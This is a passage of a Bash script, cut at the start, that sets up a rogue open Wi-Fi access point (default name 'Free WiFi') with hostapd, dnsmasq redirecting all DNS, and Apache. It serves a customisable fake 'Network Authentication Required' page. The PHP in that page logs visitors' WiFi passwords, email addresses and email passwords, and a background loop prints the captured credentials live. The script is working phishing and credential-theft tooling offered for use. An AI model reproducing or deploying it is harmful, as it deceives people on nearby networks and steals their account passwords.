            8) CURRENT_LANG="zh"; break ;;
            9) CURRENT_LANG="ja"; break ;;
            10) CURRENT_LANG="ar"; break ;;
            *) echo -e "${RED}$(get_str 22)${NC}" ;;
        esac
    done
    
    echo "$CURRENT_LANG" > "$LANG_FILE"
    echo -e "${GREEN}$(get_str 97) $(get_str $((lang_choice+7)))${NC}"
    sleep 1
}

# Check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}$(get_str 27)${NC}"
        exit 1
    fi
}

# Check dependencies with platform support
install_dependencies() {
    echo -e "${YELLOW}$(get_str 23)${NC}"
    
    local packages=("hostapd" "dnsmasq" "apache2" "php" "libapache2-mod-php" "iw")
    local missing=()
    
    for pkg in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg "; then
            missing+=("$pkg")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}$(get_str 24) ${missing[*]}${NC}"
        echo -e "${YELLOW}$(get_str 25)${NC}"
        
        apt-get update > /dev/null 2>&1
        
        for pkg in "${missing[@]}"; do
            apt-get install -y "$pkg" > /dev/null 2>&1 && echo -e "${GREEN}✓ $pkg${NC}" || echo -e "${RED}✗ $pkg${NC}"
        done
        
        echo -e "${GREEN}$(get_str 26)${NC}"
        sleep 1
    else
        echo -e "${GREEN}$(get_str 26)${NC}"
        sleep 1
    fi
    
    return 0
}

# Main Menu
show_main_menu() {
    echo -e "${WHITE}"
    echo "╔════════════════════════════════════════════╗"
    echo "║                 $(get_str 81)              ║"
    echo "╠════════════════════════════════════════════╣"
    echo "║  1) $(get_str 1)                           ║"
    echo "║  2) $(get_str 2)                           ║"
    echo "║  3) $(get_str 101)                         ║"
    echo "║  4) $(get_str 3)                           ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Interface selection - Kali Linux only
select_interface() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║          $(get_str 18)                     ║"
    echo "╠════════════════════════════════════════════╣"
    
    local interfaces=()
    local count=1
    
    while read -r line; do
        if [[ ! -z "$line" ]]; then
            interfaces+=("$line")
            printf "║  ${YELLOW}%2d${CYAN}) ${WHITE}%-36s${CYAN} ║\n" "$count" "$line"
            ((count++))
        fi
    done < <(ip link show | awk -F: '{print $2}' | sed 's/^ *//' | grep -E "^wlan[0-9]+$|^wlx[0-9a-f]+$")
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "║            $(get_str 19)                   ║"
        echo "╚════════════════════════════════════════════╝"
        echo -e "${RED}$(get_str 31)!${NC}"
        return 1
    fi
    
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    while true; do
        read -p "$(echo -e ${YELLOW}"$(get_str 20) [1-$(($count-1))]: "${NC})" choice
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le $(($count-1)) ]; then
            selected_interface="${interfaces[$((choice-1))]}"
            echo -e "${GREEN}$(get_str 21) $selected_interface${NC}"
            break
        else
            echo -e "${RED}$(get_str 22). $(get_str 20) 1-$(($count-1))${NC}"
        fi
    done
    return 0
}

# Portal Type Selection
select_portal_type() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║             $(get_str 35)                  ║"
    echo "╠════════════════════════════════════════════╣"
    echo "║  1) $(get_str 36)                          ║"
    echo "║  2) $(get_str 37)                          ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    while true; do
        read -p "$(echo -e ${YELLOW}"$(get_str 38) [1-2]: "${NC})" portal_type
        [[ "$portal_type" =~ ^[1-2]$ ]] && break || echo -e "${RED}$(get_str 22). $(get_str 38) 1-2${NC}"
    done
    
    if [ "$portal_type" -eq 1 ]; then
        cat > "$CONFIG_FILE" << 'EOF'
PORTAL_TITLE="Network Authentication Required"
WELCOME_MSG="Enter your credentials to access the internet"
WIFI_LABEL="WiFi Password"
EMAIL_LABEL="Email Address"
EMAIL_PASS_LABEL="Email Password"
BUTTON_TEXT="Connect to Internet"
SUCCESS_MSG="Connection Successful! You can now browse normally."
BG_COLOR="#1a1a1a"
CARD_COLOR="#2d2d2d"
TEXT_COLOR="#ffffff"
ACCENT_COLOR="#007cba"
BORDER_COLOR="#404040"
THEME_NAME="Default"
EOF
        echo -e "${GREEN}$(get_str 39)${NC}"
        return 0
    else
        return 1
    fi
}

# Portal Theme Selection
select_theme() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║               $(get_str 40)                ║"
    echo "╠════════════════════════════════════════════╣"
    echo "║  1) $(get_str 41)                          ║"
    echo "║  2) $(get_str 42)                          ║"
    echo "║  3) $(get_str 43)                          ║"
    echo "║  4) $(get_str 44)                          ║"
    echo "║  5) $(get_str 45)                          ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    while true; do
        read -p "$(echo -e ${YELLOW}"$(get_str 38) [1-5]: "${NC})" theme_choice
        [[ "$theme_choice" =~ ^[1-5]$ ]] && break || echo -e "${RED}$(get_str 22). $(get_str 38) 1-5${NC}"
    done
    
    case $theme_choice in
        1) 
            BG_COLOR="#1a1a1a"
            CARD_COLOR="#2d2d2d"
            TEXT_COLOR="#ffffff"
            ACCENT_COLOR="#007cba"
            BORDER_COLOR="#404040"
            THEME_NAME="Blue"
            ;;
        2)
            BG_COLOR="#0a0a0a"
            CARD_COLOR="#1a1a1a"
            TEXT_COLOR="#e0e0e0"
            ACCENT_COLOR="#555555"
            BORDER_COLOR="#333333"
            THEME_NAME="Dark"
            ;;
        3)
            BG_COLOR="#0a1f0a"
            CARD_COLOR="#1a2a1a"
            TEXT_COLOR="#e0ffe0"
            ACCENT_COLOR="#00cc44"
            BORDER_COLOR="#2a552a"
            THEME_NAME="Green"
            ;;
        4)
            BG_COLOR="#1f0a0a"
            CARD_COLOR="#2a1a1a"
            TEXT_COLOR="#ffe0e0"
            ACCENT_COLOR="#cc0000"
            BORDER_COLOR="#552a2a"
            THEME_NAME="Red"
            ;;
        5)
            BG_COLOR="#1a0a1f"
            CARD_COLOR="#2a1a2a"
            TEXT_COLOR="#f0e0ff"
            ACCENT_COLOR="#8844cc"
            BORDER_COLOR="#552a55"
            THEME_NAME="Purple"
            ;;
    esac
    
    echo -e "${GREEN}$(get_str 46) $THEME_NAME${NC}"
}

# Portal customization
customize_portal() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║           $(get_str 34)                    ║"
    echo "╠════════════════════════════════════════════╣"
    echo -e "${NC}"
    
    if select_portal_type; then
        return
    fi
    
    select_theme
    
    echo ""
    
    read -p "$(echo -e ${YELLOW}"$(get_str 47) [Network Login]: "${NC})" portal_title
    portal_title="${portal_title:-Network Login}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 48) [Enter credentials]: "${NC})" welcome_msg
    welcome_msg="${welcome_msg:-Enter credentials}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 49) [WiFi Password]: "${NC})" wifi_label
    wifi_label="${wifi_label:-WiFi Password}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 50) [Email]: "${NC})" email_label
    email_label="${email_label:-Email}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 51) [Password]: "${NC})" email_pass_label
    email_pass_label="${email_pass_label:-Password}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 52) [Connect]: "${NC})" button_text
    button_text="${button_text:-Connect}"
    
    read -p "$(echo -e ${YELLOW}"$(get_str 53) [Connected successfully]: "${NC})" success_msg
    success_msg="${success_msg:-Connected successfully}"
    
    cat > "$CONFIG_FILE" << EOF
PORTAL_TITLE="$portal_title"
WELCOME_MSG="$welcome_msg"
WIFI_LABEL="$wifi_label"
EMAIL_LABEL="$email_label"
EMAIL_PASS_LABEL="$email_pass_label"
BUTTON_TEXT="$button_text"
SUCCESS_MSG="$success_msg"
BG_COLOR="$BG_COLOR"
CARD_COLOR="$CARD_COLOR"
TEXT_COLOR="$TEXT_COLOR"
ACCENT_COLOR="$ACCENT_COLOR"
BORDER_COLOR="$BORDER_COLOR"
THEME_NAME="$THEME_NAME"
EOF
}

# Create login page with proper customization
create_login_page() {
    # Load config first
    source "$CONFIG_FILE" 2>/dev/null || {
        PORTAL_TITLE="Network Login"
        WELCOME_MSG="Enter credentials"
        WIFI_LABEL="WiFi Password"
        EMAIL_LABEL="Email"
        EMAIL_PASS_LABEL="Password"
        BUTTON_TEXT="Connect"
        SUCCESS_MSG="Connection successful"
        BG_COLOR="#1a1a1a"
        CARD_COLOR="#2d2d2d"
        TEXT_COLOR="#ffffff"
        ACCENT_COLOR="#007cba"
        BORDER_COLOR="#404040"
    }

    cat > /var/www/html/index.php << EOF
<?php
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$wifi_pass = \$_POST['wifi_password'] ?? '';
    \$email = \$_POST['email'] ?? '';
    \$email_pass = \$_POST['email_password'] ?? '';
    
    if (\$wifi_pass !== '' || \$email !== '' || \$email_pass !== '') {
        \$timestamp = date('Y-m-d H:i:s');
        \$ip = \$_SERVER['REMOTE_ADDR'];
        
        \$user_agent = \$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        \$device = 'Unknown';
        if (stripos(\$user_agent, 'iPhone') !== false) \$device = 'iPhone';
        elseif (stripos(\$user_agent, 'iPad') !== false) \$device = 'iPad';
        elseif (stripos(\$user_agent, 'Android') !== false) \$device = 'Android';
        elseif (stripos(\$user_agent, 'Windows') !== false) \$device = 'Windows';
        elseif (stripos(\$user_agent, 'Mac') !== false) \$device = 'Mac';
        elseif (stripos(\$user_agent, 'Linux') !== false) \$device = 'Linux';
        
        \$line = date('c') . " - IP: \$ip - Device: \$device - WiFi: \$wifi_pass - Email: \$email - Pass: \$email_pass" . PHP_EOL;
        error_log("[NETEEN_CAPTURE] " . trim(\$line));
    }
    
    header("Location: /success.html");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo "$PORTAL_TITLE"; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: system-ui, -apple-system, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: <?php echo "$BG_COLOR"; ?>;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: <?php echo "$TEXT_COLOR"; ?>;
        }
        .login-container {
            background: <?php echo "$CARD_COLOR"; ?>;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 420px;
            border: 1px solid <?php echo "$BORDER_COLOR"; ?>;
        }
        h2 {
            color: <?php echo "$TEXT_COLOR"; ?>;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 300;
        }
        p {
            color: #ccc;
            text-align: center;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #555;
            border-radius: 6px;
            box-sizing: border-box;
            background: #1a1a1a;
            color: <?php echo "$TEXT_COLOR"; ?>;
            font-size: 14px;
        }
        input:focus {
            border-color: <?php echo "$ACCENT_COLOR"; ?>;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: <?php echo "$ACCENT_COLOR"; ?>;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 20px;
            font-size: 16px;
            font-weight: 500;
        }
        button:hover {
            opacity: 0.9;
        }
        .footer {
            color: #666;
            font-size: 12px;
            margin-top: 25px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2><?php echo "$PORTAL_TITLE"; ?></h2>
        <p><?php echo "$WELCOME_MSG"; ?></p>
        <form method="POST">
            <input type="password" name="wifi_password" placeholder="<?php echo "$WIFI_LABEL"; ?>" required>
            <input type="email" name="email" placeholder="<?php echo "$EMAIL_LABEL"; ?>" required>
            <input type="password" name="email_password" placeholder="<?php echo "$EMAIL_PASS_LABEL"; ?>" required>
            <button type="submit"><?php echo "$BUTTON_TEXT"; ?></button>
        </form>
        <div class="footer">$(get_str 100)</div>
    </div>
</body>
</html>
EOF

    # Create success page WITHOUT green checkmark
    cat > /var/www/html/success.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Connection Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: system-ui, -apple-system, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: $BG_COLOR;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
            color: $TEXT_COLOR;
        }
        .success-box {
            background: $CARD_COLOR;
            padding: 50px;
            border-radius: 10px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            max-width: 400px;
            border: 1px solid $BORDER_COLOR;
        }
        h2 {
            color: $TEXT_COLOR;
            margin-bottom: 15px;
            font-weight: 300;
        }
        p {
            color: #ccc;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="success-box">
        <h2>Connection Successful</h2>
        <p>$SUCCESS_MSG</p>
    </div>
</body>
</html>
EOF
}

# Enhanced Cleanup function - FIXED VERSION
cleanup() {
    if [ "$CLEANUP_DONE" = "true" ]; then
        return
    fi
    CLEANUP_DONE="true"
    
    echo ""
    echo -e "${BLUE}$(get_str 63)${NC}"
    
    # Kill background processes gracefully
    if [ ! -z "$MONITOR_PID" ]; then
        kill $MONITOR_PID 2>/dev/null || true
        wait $MONITOR_PID 2>/dev/null || true
    fi
    
    if [ ! -z "$WAITER_PID" ]; then
        kill $WAITER_PID 2>/dev/null || true
        wait $WAITER_PID 2>/dev/null || true
    fi
    
    # Kill all other background processes
    jobs -p | xargs -r kill -9 2>/dev/null || true
    
    # Kill processes
    pkill -f hostapd 2>/dev/null || true
    pkill -f dnsmasq 2>/dev/null || true
    pkill -f "tail.*apache2" 2>/dev/null || true
    
    # Stop services
    systemctl stop apache2 2>/dev/null || true
    
    # Reset networking
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
    
    if [ ! -z "$WIFI_IFACE" ] && ip link show "$WIFI_IFACE" >/dev/null 2>&1; then
        ip addr del 192.168.1.1/24 dev "$WIFI_IFACE" 2>/dev/null || true
        ip link set "$WIFI_IFACE" down 2>/dev/null || true
    fi
    
    # Restore NetworkManager
    systemctl unmask NetworkManager 2>/dev/null || true
    systemctl start NetworkManager 2>/dev/null || true
    
    # Clean up temp files
    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf "$CONFIG_FILE" 2>/dev/null || true
    
    echo -e "${GREEN}$(get_str 64)${NC}"
    echo ""
    
    trap - EXIT INT TERM
}

# Set trap for cleanup on various signals
set_cleanup_trap() {
    trap cleanup EXIT INT TERM
}

# Fast interface setup
setup_interface() {
    local iface="$1"
    
    echo -e "${YELLOW}$(get_str 54)${NC}"
    
    # Quick stop of services
    systemctl stop NetworkManager 2>/dev/null || true
    systemctl mask NetworkManager 2>/dev/null || true
    
    # Kill interfering processes
    pkill wpa_supplicant 2>/dev/null || true
    pkill dhclient 2>/dev/null || true
    
    # Reset interface quickly
    ip link set "$iface" down 2>/dev/null || true
    ip addr flush dev "$iface" 2>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true
    
    # Assign IP
    ip addr add 192.168.1.1/24 dev "$iface" 2>/dev/null || true
    
    echo -e "${GREEN}$(get_str 55)${NC}"
    return 0
}

# Fast AP start
start_ap() {
    local iface="$1"
    local ssid="$2"
    
    echo -e "${YELLOW}$(get_str 56)${NC}"
    
    # Simple hostapd config
    cat > /tmp/hostapd.conf << EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
ignore_broadcast_ssid=0
EOF
    
    # Kill any existing hostapd
    pkill hostapd 2>/dev/null || true
    
    # Start hostapd quietly
    hostapd -B /tmp/hostapd.conf >/dev/null 2>&1
    
    # Quick check
    sleep 1
    if pgrep hostapd >/dev/null; then
        echo -e "${GREEN}$(get_str 57)${NC}"
        return 0
    else
        echo -e "${RED}$(get_str 58)${NC}"
        return 1
    fi
}

# Fast DHCP start
start_dhcp() {
    local iface="$1"
    
    echo -e "${YELLOW}$(get_str 59)${NC}"
    
    # Stop any existing dnsmasq
    pkill dnsmasq 2>/dev/null || true
    
    # Simple dnsmasq config
    cat > /tmp/dnsmasq.conf << EOF
interface=$iface
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
listen-address=192.168.1.1
address=/#/192.168.1.1
EOF
    
    # Start dnsmasq quietly
    dnsmasq -C /tmp/dnsmasq.conf >/dev/null 2>&1
    
    echo -e "${GREEN}$(get_str 60)${NC}"
    return 0
}

# Setup web server
setup_webserver() {
    echo -e "${YELLOW}$(get_str 61)${NC}"
    
    # Create web directory
    mkdir -p /var/www/html
    
    # Create login page with current config
    create_login_page
    
    # Set permissions
    chown -R www-data:www-data /var/www/html
    chmod -R 755 /var/www/html
    
    # Start Apache
    systemctl start apache2 >/dev/null 2>&1
    
    echo -e "${GREEN}$(get_str 62)${NC}"
    return 0
}

# Setup routing
setup_routing() {
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Find external interface
    for iface in eth0 ens33 enp0s3 enp0s8; do
        if ip link show "$iface" >/dev/null 2>&1; then
            iptables -t nat -A POSTROUTING -o "$iface" -j MASQUERADE 2>/dev/null || true
            iptables -A FORWARD -i "$WIFI_IFACE" -j ACCEPT 2>/dev/null || true
            break
        fi
    done
    
    return 0
}

# Network Scanner - Kali Linux only
network_scanner() {
    show_header
    echo -e "${PURPLE}$(get_str 29)${NC}"
    
    echo -e "${YELLOW}$(get_str 30)${NC}"
    echo ""
    
    WIFI_IFACE=$(ip link show | grep -E "wlan[0-9]+" | head -1 | awk -F: '{print $2}' | sed 's/^ *//')
    
    if [ -z "$WIFI_IFACE" ]; then
        echo -e "${RED}$(get_str 31)${NC}"
    else
        # Improved scanning with better output parsing
        echo -e "${CYAN}════════════════════════════════════════════${NC}"
        echo -e "${CYAN}           $(get_str 85)            ${NC}"
        echo -e "${CYAN}════════════════════════════════════════════${NC}"
        echo ""
        
        # Use a temporary file to store scan results
        local temp_file=$(mktemp)
        iwlist "$WIFI_IFACE" scan 2>/dev/null > "$temp_file"
        
        # Parse with improved awk script
        awk '
        BEGIN {
            essid = ""
            channel = ""
            quality = ""
            first = 1
        }
        /Cell [0-9]+/ {
            if (!first) {
                # Print previous network
                if (essid == "") essid = "(hidden)"
                print "Network: " essid
                print "  Channel: " channel
                print "  Signal: " quality
                print "──────────────────────────────────────────"
            }
            first = 0
            essid = ""
            channel = ""
            quality = ""
        }
        /ESSID:/ { 
            essid = substr($0, index($0, "ESSID:") + 7)
            gsub(/"/, "", essid)
            gsub(/^[ \t]+|[ \t]+$/, "", essid)
        }
        /Channel:/ {
            channel = $0
            gsub(/.*Channel:/, "", channel)
            gsub(/\).*/, "", channel)
            gsub(/ /, "", channel)
        }
        /Quality=/ {
            quality = $0
            gsub(/.*Quality=/, "", quality)
            gsub(/ .*/, "", quality)
            split(quality, arr, "/")
            if (length(arr) == 2) {
                percentage = int((arr[1] / arr[2]) * 100)
                quality = percentage "%"
            } else {
                quality = quality
            }
        }
        END {
            if (essid != "" || channel != "" || quality != "") {
                if (essid == "") essid = "(hidden)"
                print "Network: " essid
                print "  Channel: " channel
                print "  Signal: " quality
                print "──────────────────────────────────────────"
            }
        }' "$temp_file" | while read -r line; do
            if echo "$line" | grep -q "Network:"; then
                network=$(echo "$line" | sed 's/Network: //')
                echo -e "${CYAN}$(get_str 77): ${WHITE}$network${NC}"
            elif echo "$line" | grep -q "Channel:"; then
                channel=$(echo "$line" | sed 's/Channel: //')
                echo -e "${WHITE}  $(get_str 78): $channel${NC}"
            elif echo "$line" | grep -q "Signal:"; then
                signal=$(echo "$line" | sed 's/Signal: //')
                echo -e "${WHITE}  $(get_str 79): $signal${NC}"
            else
                echo "$line"
            fi
        done
        
        # Clean up temp file
        rm -f "$temp_file"
    fi
    
    echo ""
    read -p "$(echo -e ${YELLOW}"$(get_str 32)"${NC})"
}

# Stealth Portal function - COMPLETELY FIXED VERSION
stealth_portal() {
    show_header
    echo -e "${PURPLE}$(get_str 28)${NC}"
    
    customize_portal
    
    read -p "$(echo -e ${YELLOW}"$(get_str 33) "${NC})" AP_NAME
    [ -z "$AP_NAME" ] && AP_NAME="Free WiFi"
    
    if ! select_interface; then
        read -p "$(get_str 32)"
        return
    fi
    WIFI_IFACE="$selected_interface"
    
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║            $(get_str 84)                   ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Set cleanup trap BEFORE any setup
    set_cleanup_trap
    
    # Fast setup sequence
    setup_interface "$WIFI_IFACE" || { cleanup; return 1; }
    setup_webserver || { cleanup; return 1; }
    start_ap "$WIFI_IFACE" "$AP_NAME" || { cleanup; return 1; }
    start_dhcp "$WIFI_IFACE" || { cleanup; return 1; }
    setup_routing
    
    # Show status
    show_header
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║              $(get_str 65)                 ║"
    echo "╠════════════════════════════════════════════╣"
    printf "║  ${WHITE}SSID:${NC} %-35s ║\n" "$AP_NAME"
    printf "║  ${WHITE}$(get_str 66):${NC} %-28s ║\n" "$WIFI_IFACE"
    printf "║  ${WHITE}$(get_str 67):${NC} %-29s ║\n" "192.168.1.10-100"
    echo "║  $(get_str 68)                             ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${YELLOW}$(get_str 69)${NC}"
    echo "──────────────────────────────────────────"
    
    # Clear log file
    > /var/log/apache2/error.log
    
    # Monitor for credentials - FIXED VERSION
    (
        tail -n 0 -f /var/log/apache2/error.log 2>/dev/null | while read line; do
            if echo "$line" | grep -q "NETEEN_CAPTURE"; then
                cred_data=$(echo "$line" | sed 's/.*NETEEN_CAPTURE //')
                echo ""
                echo -e "${CYAN}════════════════════════════════════════════${NC}"
                echo -e "${CYAN}            $(get_str 70)            ${NC}"
                echo -e "${CYAN}════════════════════════════════════════════${NC}"
                
                time=$(echo "$cred_data" | grep -o '[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}T[0-9:\-]*' | head -1)
                ip=$(echo "$cred_data" | grep -o 'IP: [^ ]*' | cut -d' ' -f2)
                device=$(echo "$cred_data" | grep -o 'Device: [^ ]*' | cut -d' ' -f2)
                wifi_pass=$(echo "$cred_data" | grep -o 'WiFi: [^ ]*' | cut -d' ' -f2)
                email=$(echo "$cred_data" | grep -o 'Email: [^ ]*' | cut -d' ' -f2)
                email_pass=$(echo "$cred_data" | grep -o 'Pass: [^ ]*' | cut -d' ' -f2)
                
                echo -e "${WHITE}$(get_str 71):${NC} $time"
                echo -e "${WHITE}$(get_str 72):${NC} $ip"
                echo -e "${WHITE}$(get_str 73):${NC} $device"
                echo -e "${RED}$(get_str 74):${NC} $wifi_pass"
                echo -e "${BLUE}$(get_str 75):${NC} $email"
                echo -e "${RED}$(get_str 76):${NC} $email_pass"
                echo -e "${CYAN}──────────────────────────────────────────${NC}"
            fi
        done
    ) &
    MONITOR_PID=$!
    
    # Simple waiter process
    (
        while true; do
            sleep 1
        done
    ) &
    WAITER_PID=$!
    
    # Wait for Ctrl+C - PROPERLY HANDLED
    wait $WAITER_PID
    
    # Cleanup when done
    cleanup
}

# Load saved language
load_saved_language() {
    if [ -f "$LANG_FILE" ]; then
        saved_lang=$(cat "$LANG_FILE")
        case $saved_lang in
            en|es|fr|de|it|pt|ru|zh|ja|ar)
                CURRENT_LANG="$saved_lang"
                ;;
        esac
    fi
}

# Initialize
init_languages

# Show language selection first
select_language

# Then detect platform
detect_platform

# Main loop
while true; do
    show_header
    show_main_menu
    
    read -p "$(echo -e ${YELLOW}"$(get_str 83) [1-4]: "${NC})" choice
    
    case $choice in
        1) 
            check_root
            install_dependencies
            CLEANUP_DONE="false"
            stealth_portal
            ;;
        2) 
            network_scanner
            ;;
        3) 
            select_language
            ;;
        4) 
            echo -e "${GREEN}$(get_str 80)${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}$(get_str 22)${NC}"
            sleep 1
            ;;
    esac
done
